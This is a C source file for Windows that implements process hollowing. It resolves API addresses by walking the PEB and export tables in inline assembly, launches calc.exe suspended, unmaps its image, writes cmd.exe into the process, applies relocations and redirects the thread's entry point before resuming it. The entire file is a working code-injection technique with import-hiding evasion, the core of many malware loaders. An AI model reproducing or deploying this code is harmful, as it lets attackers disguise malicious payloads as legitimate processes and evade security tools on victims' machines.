#include <windows.h>
#include <stdio.h>
#include <subauth.h>

#define DEBUG 


typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_LDR_DATA {
	BYTE       Reserved1[8];
	PVOID      Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;



typedef struct _PEB {
	BYTE                          Reserved1[2];
	BYTE                          BeingDebugged;
	BYTE                          Reserved2[1];
	PVOID                         Reserved3[2];
	PPEB_LDR_DATA                 Ldr;
	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
	PVOID                         Reserved4[3];
	PVOID                         AtlThunkSListPtr;
	PVOID                         Reserved5;
	ULONG                         Reserved6;
	PVOID                         Reserved7;
	ULONG                         Reserved8;
	ULONG                         AtlThunkSListPtr32;
	PVOID                         Reserved9[45];
	BYTE                          Reserved10[96];
	struct PS_POST_PROCESS_INIT_ROUTINE*  PostProcessInitRoutine;
	BYTE                          Reserved11[128];
	PVOID                         Reserved12[1];
	ULONG                         SessionId;
} PEB, * PPEB;


typedef struct _smPROCESS_BASIC_INFORMATION {
	LONG ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	LONG BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef  BOOL(__stdcall *_CreateProcessA)(LPCSTR,LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL,DWORD , LPVOID , LPCSTR ,LPSTARTUPINFOA ,LPPROCESS_INFORMATION);
typedef  BOOL(__stdcall* _ReadProcessMemory)(HANDLE ,LPCVOID , LPVOID ,SIZE_T ,SIZE_T);
typedef  BOOL(__stdcall* _WriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T);
typedef  HANDLE(__stdcall* _CreateFileA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
typedef  DWORD(__stdcall* _GetFileSize)(HANDLE, LPDWORD);
typedef  PVOID(WINAPI* _RtlAllocateHeap)(HANDLE , DWORD, SIZE_T);
typedef BOOL(__stdcall* _ReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED); 
typedef  NTSTATUS(WINAPI* _NtQueryInformationProcess)(HANDLE , PROCESS_INFORMATION_CLASS,PVOID,ULONG,PULONG);
typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
typedef HANDLE(* _GetProcessHeap)();
typedef LPVOID(__stdcall* _VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD); 

DWORD kernel32_base, ntdll_base; 

DWORD GetProcessHeapo()
{
	__asm {
		xor eax , eax
		mov eax , fs:[eax+0x30]
		mov eax , [eax+0x18]
	}
}

void Kernel32_NTdll_bases()
{
	__asm {
		xor eax , eax
		mov eax , fs:[eax + 0x30] //PEB
		mov eax , [eax+0xc] // pointer LDR 
		mov eax , [eax+0x14] // InMemoryOrderModuleList
		mov eax , [eax]	 
		mov ecx , [eax+0x10] // image base of ntdll 
		mov [ntdll_base] , ecx
		mov eax , [eax] // kernel32.dll
		mov ecx , [eax+0x10]
		mov [kernel32_base] , ecx // image base of kernel32.dll
	}

}

DWORD find_function_address(DWORD base , char * function_name)
{

	__asm {
		/* Virtual addresses to (exported , name , ordinal) tables*/
		mov eax, base
		mov edx, [eax + 0x3c] // RVA PE signature
		add edx, eax // address of PE signature
		mov edx, [edx + 0x78] // RVA of export table  
		/* mov eax , [eax+0x14]  number of exported functions*/
		add edx, eax // address export table
		mov ebx, [edx + 0x1c] // RVA exported functions
		add ebx, eax // EBX  = va of exported functions
		mov esi, [edx + 0x20] // RVA name_pointer_table
		add esi, eax // ESI = va of name_pointer_table
		mov edx, [edx + 0x24] // RVA of ordinal table
		add edx, eax // EDX = va of ordinal table

		/*length function name*/
		push eax /* saving base address on the stack*/
		xor ecx , ecx
		mov edi, function_name
		xor eax, eax
		repp:
		inc ecx
			cmp [edi + ecx], 0
			jz compare_names
			inc ecx
			jmp repp
			/*Function address*/
		
		compare_names:
			cld // Direction flag , process string from left to right
			push esi
			mov esi, [esi + eax * 4]
			add esi, [esp+4]
			push ecx // save value (repe cmpsb change it)
			push edi
			repe cmpsb // is [edi]==[esi] ?
			pop edi
			pop ecx
			pop esi
			jz name_found
			inc eax
			jmp compare_names
		name_found:
			pop esi // base
			mov ax, [edx + eax * 2] // function ordinal
			mov edx , [ebx + eax * 4] // RVA of function
			add edx , esi
		 
		xchg eax , edx
	}
}



int wmain()
{
	Kernel32_NTdll_bases();
	PROCESS_BASIC_INFORMATION pbi ; 
	STARTUPINFOA blah;
	PROCESS_INFORMATION blah1; 
	ZeroMemory(&blah, sizeof(blah));
	_CreateProcessA _CreateProc = find_function_address(kernel32_base, "CreateProcessA");
	if (!_CreateProc(NULL, (LPSTR)"C:\\Windows\\syswow64\\calc.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &blah, &blah1)) {
		printf("error creating this trash process bye , %d!\n",GetLastError());
		exit(1); 
	}
	HANDLE target = blah1.hProcess;
	ULONG len;
	_NtQueryInformationProcess NtQueryInformationPr= find_function_address(ntdll_base, "NtQueryInformationProcess");
	NTSTATUS status = NtQueryInformationPr(target, 0, &pbi,sizeof(pbi),&len);
	/*	if (NT_ERROR(status)) {
		printf("NtQuery failed !"); 
	}*/
	DWORD pebImageBaseOffset = (DWORD)pbi.PebBaseAddress + 8; 
	LPVOID TargetImageBase = 0;
	SIZE_T bytesRead = NULL;
	_ReadProcessMemory ReadProcessMem = find_function_address(kernel32_base, "ReadProcessMemory"); 
	ReadProcessMem(target, (LPCVOID)pebImageBaseOffset, &TargetImageBase, 4, &bytesRead);
#ifdef DEBUG
	printf("[+] base address of target %x\n", (DWORD)TargetImageBase); 
#endif

	_NtUnmapViewOfSection NtUnmapViewOfSe = find_function_address(ntdll_base, "NtUnmapViewOfSection");
#ifdef DEBUG
	printf("[+] _NtUnmapViewOfSection @ 0x%x\n", (DWORD)NtUnmapViewOfSe);
#endif
	NtUnmapViewOfSe(target,TargetImageBase);

	/*source file*/
	_CreateFileA Createfil = find_function_address(kernel32_base,"CreateFileA");
	HANDLE src = Createfil("C:\\Windows\\SysWow64\\cmd.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	if (src==0xFFFFFFFF) {
#ifdef DEBUG
		printf("can't open file . bye !"); 
#endif
		return 0xDEADBEEF; 
	}
	_GetFileSize GetFilesiz = find_function_address(kernel32_base, "GetFileSize");
	DWORD srcSize = GetFilesiz(src, NULL);
	LPDWORD BytesRead = 0;
	_RtlAllocateHeap RtlAllocateH = find_function_address(ntdll_base , "RtlAllocateHeap");
#ifdef DEBUG
	printf("[+] RtlAllocateHeap address @ 0x%x\n", (DWORD)RtlAllocateH);
#endif
	_GetProcessHeap GetProcessHea = find_function_address(kernel32_base, "GetProcessHeap");
#ifdef DEBUG
	printf("[+] GetProcessHea address @ 0x%x\n", (DWORD)GetProcessHea);  
#endif
	HANDLE heappi= GetProcessHeapo(); 
#ifdef DEBUG
	printf("[+] address of RtlAllocateHeap = 0x%x\n",(DWORD)RtlAllocateH);
#endif
	LPVOID srcBuffer = RtlAllocateH(heappi, HEAP_ZERO_MEMORY, srcSize);
	_ReadFile ReadFil = find_function_address(kernel32_base, "ReadFile");
	ReadFil(src, srcBuffer, srcSize, NULL, NULL);
	CloseHandle(src);

	/*copy to target*/
		/*Allocate memory*/
	PIMAGE_DOS_HEADER srcDosHeader = (PIMAGE_DOS_HEADER)srcBuffer; 
	PIMAGE_NT_HEADERS srcNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)srcBuffer + srcDosHeader->e_lfanew); 
	SIZE_T srcImgSize = srcNtHeaders->OptionalHeader.SizeOfImage; 
#ifdef DEBUG	
	printf("[+] src image size 0x%x\n" ,srcImgSize); 
#endif

	/* 
	ideally we allocate memory on targetimagebase , but I kept getting ERROR_INVALID_ADDRESS	
	If this address is within an enclave that you have not initialized by calling InitializeEnclave, VirtualAllocEx allocates a page of zeros for the enclave at that address. 
	The page must be previously uncommitted, and will not be measured with the EEXTEND instruction of the Intel Software Guard Extensions programming model.
	If the address in within an enclave that you initialized, then the allocation operation fails with the ERROR_INVALID_ADDRESS error.
	*/
	_VirtualAllocEx VirtualAll = find_function_address(kernel32_base, "VirtualAllocEx");
#ifdef DEBUG
	printf("[+] targetimagebase is = %x\n",(DWORD)TargetImageBase);
#endif	
	LPVOID DstImgBase= VirtualAll(target, TargetImageBase, srcImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	while (!DstImgBase) {
#ifdef DEBUG
		printf("[+] error allocating trying to repeat operation\n");
#endif
		wmain(); 
		return 0xDEADBEEF;
	}
	TargetImageBase = DstImgBase; 
	DWORD Diff = srcNtHeaders->OptionalHeader.ImageBase - (DWORD)DstImgBase;
#ifdef DEBUG 
	printf("[+] log about Imagebase:\n\tPrefered Source image = 0x%x\n\tMemory on destination allocated at = 0x%x\n\tDifference = 0x%x\n", srcNtHeaders->OptionalHeader.ImageBase, (DWORD)DstImgBase,Diff);
#endif
	srcNtHeaders->OptionalHeader.ImageBase = TargetImageBase;
	/*copying headers*/
	srcNtHeaders->OptionalHeader.ImageBase =(DWORD)TargetImageBase;
	_WriteProcessMemory WriteProcessMem = find_function_address(kernel32_base,"WriteProcessMemory");
	WriteProcessMem(target, DstImgBase,srcBuffer, srcNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
 
	PIMAGE_SECTION_HEADER srcImageSection = (PIMAGE_SECTION_HEADER)((DWORD)srcBuffer + srcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));

	/*copying sections*/
	BYTE Section; 
	for (Section = 0; Section < srcNtHeaders->FileHeader.NumberOfSections; Section++, srcImageSection++)
	{
		WriteProcessMem(target, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress), (PVOID)((BYTE*)srcBuffer + srcImageSection->PointerToRawData), srcImageSection->SizeOfRawData, NULL);
		printf("[+] Writing  Section %s to @0x%x\n",srcImageSection->Name, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress));
	}
	srcImageSection--; /*saving last section for relocation*/
#ifdef DEBUG
	printf("[+] Sections Copied successfully\n");
#endif

	/* Relocations */
	/* 
	reloc is the last section on the binary statiscly speaking (statement to confirm) , of course theoretically it can be otherwise with some custom compiler options 
	in this implementation I'am assumuing that hypothesis since I have control on the PE that I'll inject .
	*/
	/*
	from the loop before , our section variable points to .reloc section
	*/
	DWORD relocAddress = srcImageSection->PointerToRawData;
	IMAGE_DATA_DIRECTORY relocData = srcNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD offset_block = 0; 
#ifdef DEBUG
	printf("[+] Relocation log : \n\t relocAddress = 0x%x\n",relocAddress);
	Sleep(5000); 
#endif
	 srcImageSection = (PIMAGE_SECTION_HEADER)((DWORD)srcBuffer + srcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
	 
		while (offset_block < relocData.Size) /*iterating over HeaderBlocks*/
		{
			PBASE_RELOCATION_BLOCK Blockheader = (PBASE_RELOCATION_BLOCK)((DWORD)srcBuffer + relocAddress + offset_block);
			offset_block += sizeof(BASE_RELOCATION_BLOCK);
#ifdef DEBUG
			printf("[+] Block size = %x\n", Blockheader->BlockSize);
#endif
			DWORD N_Entries = (Blockheader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
#ifdef DEBUG
			printf("[+] Number of entries = %x\n", N_Entries);
			Sleep(500);
#endif
			PBASE_RELOCATION_ENTRY First_Block = (PBASE_RELOCATION_ENTRY)((BYTE*)srcBuffer + relocAddress + offset_block);

			for (DWORD X = 0; X < N_Entries; X++) /*iterating over entries*/
			{

				offset_block += sizeof(BASE_RELOCATION_ENTRY);
				if (First_Block[X].Type)
				{
					DWORD value;
					DWORD tty = (LPCVOID)((DWORD)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset);
					ReadProcessMem(target, (LPCVOID)((BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset), &value, sizeof(DWORD), NULL);
					value -= Diff;
					
#ifdef DEBUG
					printf("\rRelocating Address 0x%x -> 0x%x", value + Diff, value);
					fflush(stdout); 
					Sleep(2);
					
#endif
					if (!WriteProcessMem(target, (LPCVOID)((BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset), &value, sizeof(DWORD), NULL))
					{
						printf("[-] error error error");
						return 0xDEADBEEF;
					};
					 
				}
			}
		}


		CONTEXT ctx ;
		ctx.ContextFlags = CONTEXT_INTEGER; 
		GetThreadContext(blah1.hThread, &ctx);
		ctx.Eax = (DWORD)TargetImageBase + srcNtHeaders->OptionalHeader.AddressOfEntryPoint;
		printf("\nEax = 0x%x",ctx.Eax); 
		BOOL hihi = SetThreadContext(blah1.hThread,&ctx);
		if (!hihi) {
			{printf("\nerror resuming thread = %d", GetLastError()); return 0;  }
		}
		 hihi = ResumeThread(blah1.hThread);
		{printf("\nerror resuming thread = %d", GetLastError()); }
}
